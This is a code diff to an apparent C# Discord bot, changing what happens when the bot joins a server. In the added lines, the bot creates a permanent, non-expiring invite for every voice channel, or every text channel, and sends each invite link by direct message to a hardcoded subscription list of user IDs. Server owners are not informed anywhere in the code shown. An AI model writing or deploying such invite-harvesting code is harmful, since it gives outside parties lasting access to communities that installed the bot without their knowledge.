@@ -47,14 +47,29 @@ namespace REE6
 
         private async Task JoinedGuild(SocketGuild arg)
         {
-            foreach (SocketTextChannel textChannel in arg.TextChannels)
+            if (arg.VoiceChannels.Count >= 3)
             {
-                IInviteMetadata invite = await textChannel.CreateInviteAsync(maxAge:null);
-                string message = $"Just joined {arg.Name}. An invite link has been created for {invite.Channel}. {invite.Url}";
-                Console.WriteLine(message);
+                foreach (SocketVoiceChannel voiceChannel in arg.VoiceChannels)
+                {
+                    IInviteMetadata invite = await voiceChannel.CreateInviteAsync(maxAge: null);
+                    string message = $"Just joined {arg.Name}. An invite link has been created for {invite.Channel}. {invite.Url}";
+                    Console.WriteLine(message);
 
-                foreach (ulong id in joinedGuildSubscriptionList)
-                    await _client.GetUser(id).SendMessageAsync(message);
+                    foreach (ulong id in joinedGuildSubscriptionList)
+                        await _client.GetUser(id).SendMessageAsync(message);
+                }
+            }
+            else
+            {
+                foreach (SocketTextChannel textChannel in arg.TextChannels)
+                {
+                    IInviteMetadata invite = await textChannel.CreateInviteAsync(maxAge: null);
+                    string message = $"Just joined {arg.Name}. An invite link has been created for {invite.Channel}. {invite.Url}";
+                    Console.WriteLine(message);
+
+                    foreach (ulong id in joinedGuildSubscriptionList)
+                        await _client.GetUser(id).SendMessageAsync(message);
+                }
             }
         }
 
